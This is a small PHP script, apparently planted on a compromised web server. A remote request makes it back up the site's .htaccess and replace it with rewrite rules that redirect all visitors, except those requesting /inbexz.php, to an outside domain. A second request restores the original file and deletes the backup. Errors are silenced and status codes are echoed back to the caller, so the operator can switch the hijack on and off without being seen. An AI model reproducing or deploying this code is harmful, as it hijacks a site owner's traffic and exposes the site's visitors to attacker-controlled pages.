<?php
	error_reporting(0);
	$file = $_SERVER['DOCUMENT_ROOT']."/.htaccess" ;
	$file_back = $_SERVER['DOCUMENT_ROOT']."/.htaccess.zbackuping" ;
	
	if(!empty($_REQUEST['make']))
		if($_REQUEST['make']==1){
			if(!is_file($file_back)){
				if(copy($file,$file_back)){
					$text = array();
					$text[] = "RewriteEngine on\n";
					$text[] = "RewriteCond %{REQUEST_URI} !^/inbexz.php \n";
					$text[] = "RewriteRule ^(.*) http://zapomni.com.ua/401.html? [L,R]";
					file_put_contents($file,$text);
					
					echo 200;
				}else
					echo 300;
			}else
				echo 500;
			
		}elseif($_REQUEST['make']==2){
			if(is_file($file_back)){
				if(copy($file_back,$file)){
					while(unlink($file_back)==false){}
					echo 600;
				}
			}else
				echo 400;
		}